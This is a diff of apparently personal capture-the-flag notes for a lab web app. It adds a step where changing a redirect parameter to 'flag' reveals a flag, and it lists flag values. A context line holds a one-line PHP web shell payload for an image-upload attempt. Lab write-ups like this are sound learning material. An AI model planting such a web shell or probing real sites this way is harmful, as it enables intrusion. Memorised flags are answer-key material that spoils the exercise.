@@ -82,3 +82,7 @@ VM147:18 Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693
 # 8. Upload Image -  NOT FOUND
   1. upload image with ```<?php system($_GET['cmd']); ?>```
 
+# 9. Socials redirect
+  1. Social media icon links to http://10.11.249.72/index.php?page=redirect&site=instagram
+  2. Try http://10.11.249.72/index.php?page=redirect&site=flag
+  3. Flag = b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
